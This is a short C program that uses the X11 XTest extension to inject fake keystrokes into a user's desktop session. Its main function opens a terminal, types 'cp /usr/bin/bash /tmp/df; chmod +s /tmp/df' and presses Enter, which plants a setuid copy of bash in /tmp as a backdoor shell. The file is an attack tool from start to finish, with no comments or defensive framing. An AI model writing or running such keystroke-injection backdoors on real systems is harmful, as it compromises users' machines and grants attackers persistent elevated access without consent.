#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/extensions/XTest.h>
#include <stdio.h>
#include <stdbool.h>
#include <unistd.h>
#include <ctype.h>
#include <string.h>

int type(Display *d, const char *s) {
  const char *regular = "1234567890-=[]\\;',./`";
  const char *shifted = "!@#$%^&*()_+{}|:\"<>?~";

  KeyCode shift = XKeysymToKeycode(d, XK_Shift_L);

  for (const unsigned char *p = (const unsigned char *)s; *p; ++p) {
    unsigned char ch = *p;
    KeySym key;
    bool use_shift = false;

    if (ch >= 'a' && ch <= 'z') {
      key = ch;
    } else if (ch >= 'A' && ch <= 'Z') {
      key = tolower(ch);
      use_shift = true;
    } else if (ch == ' ') {
      key = XK_space;
    } else {
      const char *pos = strchr(regular, ch);

      if (pos) {
        key = (unsigned char)*pos;
      } else {
        pos = strchr(shifted, ch);
        if (!pos) {
          fprintf(stderr, "unknown char\n");
          return 0;
        }

        size_t index = (size_t)(pos - shifted);
        key = (unsigned char)regular[index];
        use_shift = true;
      }
    }

    KeyCode code = XKeysymToKeycode(d, key);
    if (!code) {
      fprintf(stderr, "unknown keycode\n");
      return 0;
    }

    if (use_shift)
      XTestFakeKeyEvent(d, shift, true, CurrentTime);

    XTestFakeKeyEvent(d, code, true, CurrentTime);
    XTestFakeKeyEvent(d, code, false, CurrentTime);

    if (use_shift)
      XTestFakeKeyEvent(d, shift, false, CurrentTime);
  }

  XFlush(d);
  return 1;
}

void open_terminal(Display *d) {
  KeyCode ctrl = XKeysymToKeycode(d, XK_Control_L);
  KeyCode alt = XKeysymToKeycode(d, XK_Alt_L);
  KeyCode t = XKeysymToKeycode(d, XK_t);

  XTestFakeKeyEvent(d, ctrl, true, CurrentTime);
  XTestFakeKeyEvent(d, alt, true, CurrentTime);
  XTestFakeKeyEvent(d, t, true, CurrentTime);

  XTestFakeKeyEvent(d, ctrl, false, CurrentTime);
  XTestFakeKeyEvent(d, alt, false, CurrentTime);
  XTestFakeKeyEvent(d, t, false, CurrentTime);

  XFlush(d);
}

void press_enter(Display *d) {
  KeyCode enter = XKeysymToKeycode(d, XK_Return);

  XTestFakeKeyEvent(d, enter, true, CurrentTime);
  XTestFakeKeyEvent(d, enter, false, CurrentTime);

  XFlush(d);
}

int main(void) {
  Display *display = XOpenDisplay(NULL);
  if (!display) {
    fprintf(stderr, "couldnt open display\n");
    return 1;
  }

  open_terminal(display);
  sleep(1);
  int r = type(display, "cp /usr/bin/bash /tmp/df; chmod +s /tmp/df");
  if (!r) return 1;
  sleep(1);
  press_enter(display);

  XFlush(display);
  XCloseDisplay(display);
  return 0;
}
